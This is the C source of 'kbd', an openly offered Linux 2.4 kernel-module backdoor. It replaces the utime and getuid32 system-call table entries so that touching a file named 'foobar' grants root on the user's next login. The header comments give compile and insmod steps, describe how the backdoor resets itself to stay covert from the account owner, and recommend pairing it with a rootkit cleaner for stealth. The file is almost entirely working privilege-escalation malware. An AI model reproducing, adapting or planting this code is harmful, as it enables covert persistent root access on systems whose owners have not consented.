/* kbd - Linux loadable kernel module backdoor 		 	*/
/* 6.21.01 spaceork@dhp.com 					*/
/* 								*/
/* Version 3.0 (kbdv3.c) for Linux 2.4.X			*/ 
/* Tested on Linux 2.4.5					*/
/*								*/
/* compile: host:~# gcc -c -O2 kbdv2.c				*/ 
/*								*/
/* add(as root): host:~# insmod kbdv2.o				*/  
/* remove(as root): host:~# rmmod kbdv2.o			*/		
/* 								*/
/* Usage notes:							*/
/* kbd is a nice little backdoor that allows root access by     */
/* modifing the SYS_utime and SYS_getuid32 system calls.	*/
/* Usage after insmod is fairly strait forward:			*/	     
/* 1. login as a normal user    				*/		
/* 2. host:~$ touch foobar					*/
/* 3. login again under the *same* username			*/ 
/* 4. the second login session will be given root privileges	*/	     
/*    host:~# id						*/
/*    uid=0(root) gid=0(root) groups=100(users)			*/
/* 5. Remember to repeat this procedure everytime you plan on   */
/*    using the backdoor. To keep this covert, the special uid  */
/*    resets after root is given out, this prevents the      	*/  
/*    legitimate owner of the account from receiving a		*/
/*    suspicious root shell when he/she logs in.		*/ 
/*						 		*/
/* Note: If you want stealth capability, I recommend using kbd  */
/*       in conjunction with cleaner.c from the adore rootkit   */
/*	 by stealth (http://spider.scorpions.net/~stealth)	*/

#define MODULE
#define __KERNEL__

#include <syscall.h>
#include <asm/uaccess.h>
#include <linux/module.h>
#include <linux/modversions.h>
#include <linux/unistd.h>
#include <linux/utime.h>
#include <linux/version.h>
#include <linux/sched.h>
#include <linux/mm.h>

#define FILE_NAME "foobar"		/* change to whatever you wish */

extern void *sys_call_table[];

/* system calls we will replace */
int (*orig_utime)(const char *filename, struct utimbuf *buf);
int (*orig_getuid32)();
int u;

int bd_utime(const char *filename, struct utimbuf *buf)
{
	int tmp;
	char *k_pathname;
	char name[] = FILE_NAME; 
	
	/* copy to kernel space */
	k_pathname = (char*) kmalloc(256, GFP_KERNEL); 

	copy_from_user(k_pathname, filename, 255);

	/* Is the pathname our secret one? If so make the current uid special. */
        if (strstr(k_pathname, (char*)&name) != NULL) 
		u = current->uid; 
          
	 tmp = (*orig_utime)(filename, buf);
	 return tmp;
}

int bd_getuid32()
{
	int tmpp;

	/* Give root to the special uid, then reset the value of u. */
	if (current->uid == u) 
	{ 
		current->uid = 0;
		current->euid = 0;
		current->gid = 0;
		current->egid = 0;
     		u = 55555; 	/* change if this bothers you */
		return 0;
	}

	tmpp = (*orig_getuid32) ();
	return tmpp;
}


int init_module(void)		/* setup the module */
{
        orig_utime = sys_call_table[SYS_utime];
	orig_getuid32 = sys_call_table[SYS_getuid32]; 

        sys_call_table[SYS_utime] = bd_utime;
	sys_call_table[SYS_getuid32] = bd_getuid32;

        return 0;
}

void cleanup_module(void)	/* shutdown the module */	
{
        sys_call_table[SYS_utime] = orig_utime;
 	sys_call_table[SYS_getuid32] = orig_getuid32;
}
